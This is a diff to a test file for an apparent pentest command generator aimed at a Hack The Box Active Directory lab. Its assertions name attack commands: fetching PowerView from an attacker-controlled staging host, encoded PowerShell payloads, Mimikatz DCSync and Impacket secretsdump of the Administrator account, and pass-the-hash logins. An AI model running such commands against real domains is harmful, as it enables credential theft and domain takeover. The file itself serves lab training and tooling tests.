@@ -39,6 +39,8 @@ test("DCSync selection generates scoped retrieval between grant and cleanup", ()
   assert.match(combined, /nxc winrm 10\.129\.95\.210 -d 'htb\.local' -u 'svc_exchange' -p 'Password123!'/);
   assert.match(combined, /http:\/\/10\.10\.15\.240:8000\/PowerView\.ps1/);
   assert.match(combined, /-EncodedCommand \$payload/);
+  assert.match(combined, /PowerView download or load failed/);
+  assert.match(combined, /Resolved principal SID/);
   assert.match(combined, /lsadump::dcsync \/domain:htb\.local \/user:Administrator/);
   assert.match(combined, /-just-dc-user 'Administrator'/);
   assert.ok(grantAt >= 0 && retrieveAt > grantAt && cleanupAt > retrieveAt);
@@ -57,6 +59,18 @@ test("non-DCSync rights regenerate generic grant and cleanup without replication
   assert.doesNotMatch(combined, /lsadump::dcsync|secretsdump/);
   assert.match(combined, /acl-before\.xml/);
   assert.match(combined, /Compare-Object/);
+  assert.match(combined, /Where-Object \{ \$null -ne \$_ \}/);
+  assert.match(combined, /No added ACL entry was detected/);
+  assert.doesNotMatch(combined, /"\$\(\$_\.ActiveDirectoryRights\)\|/);
+});
+
+test("PowerView staging validates content and reports a port or log failure", () => {
+  const commands = renderedCommands();
+  const confirmation = commands.find((command) => command.key === "acl-powerview-check");
+
+  assert.match(confirmation.value, /grep -qi 'function Get-DomainObjectAcl'/);
+  assert.match(confirmation.value, /PowerView HTTP staging failed/);
+  assert.match(confirmation.value, /PowerView loaded successfully/);
 });
 
 test("DCSync for a different ACL principal omits credential-bound Impacket commands", () => {
@@ -69,6 +83,13 @@ test("unsupported PowerView rights produce a validation command instead of an AC
   const commands = renderedCommands({ aclRights: "arbitrary-right" });
   assert.deepEqual(commands.map((command) => command.key), ["acl-invalid-right"]);
   assert.match(commands[0].value, /All, ResetPassword, WriteMembers, DCSync/);
+});
+
+test("DCSync rejects a user ACL target and directs the operator to the domain", () => {
+  const commands = renderedCommands({ aclTarget: "svc-alfresco" });
+
+  assert.deepEqual(commands.map((command) => command.key), ["acl-invalid-dcsync-target"]);
+  assert.match(commands[0].value, /Set ACL TARGET to htb\.local, not svc-alfresco/);
 });
 
 test("hash-only authentication uses NetExec and Evil-WinRM pass-the-hash switches", () => {
